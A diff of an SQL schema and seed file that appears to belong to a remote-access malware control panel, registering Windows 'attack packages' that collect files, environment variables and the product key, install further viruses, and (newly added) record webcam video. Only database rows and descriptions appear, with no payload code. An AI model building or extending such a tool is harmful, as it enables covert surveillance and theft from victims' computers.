@@ -57,9 +57,8 @@ CREATE TABLE IF NOT EXISTS resource_usage
 (
     id                      bigint unsigned not null auto_increment,
     static_disk             bigint unsigned default 0, /* measured in bytes */
-    static_bandwidth        bigint unsigned default 0, /* measured in bytes */
+    dynamic_bandwidth        bigint unsigned default 0, /* measured in bytes */
     dynamic_api_geolocation bigint unsigned default 0, /* measured in cents */
-    last_updated_time       bigint unsigned default 0, /* unix time */
     index (id),
     primary key (id)
 );
@@ -93,13 +92,13 @@ VALUES ("win.oneTime.CheckPermission",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CheckPermission\\CheckPermission",
         "Windows/OneTime/CheckPermission",
         "adv.CheckPermission",
-        "Check permission of a bunch of folders");
+        "Checks permission of a bunch of folders");
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
 VALUES ("win.oneTime.CollectEnv",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectEnv\\CollectEnv",
         "Windows/OneTime/CollectEnv",
         "easy.CollectEnv",
-        "Collect environmental variables, like JAVA_PATH, Path, UserDomain, etc.");
+        "Collects environmental variables, like JAVA_PATH, Path, UserDomain, etc.");
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
 VALUES ("win.oneTime.CollectFile",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectFile\\CollectFile",
@@ -123,7 +122,7 @@ VALUES ("win.oneTime.NewVirus",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\NewVirus\\NewVirus",
         "Windows/OneTime/NewVirus",
         "easy.NewVirus",
-        "Install a new virus");
+        "Installs a new virus");
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
 VALUES ("win.oneTime.Power",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Power\\Power",
@@ -153,10 +152,16 @@ VALUES ("win.oneTime.SystemInfo",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SystemInfo\\SystemInfo",
         "Windows/OneTime/SystemInfo",
         "easy.SystemInfo",
-        "Get some basic system information.");
+        "Gets some basic system information.");
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
 VALUES ("win.oneTime.ProductKey",
         "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ProductKey\\ProductKey",
         "Windows/OneTime/ProductKey",
         "easy.ProductKey",
-        "Get Windows product key");
+        "Gets Windows product key");
+INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
+VALUES ("win.oneTime.Webcam",
+        "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Webcam\\Webcam",
+        "Windows/OneTime/Webcam",
+        "easy.Webcam",
+        "Takes webcam video");
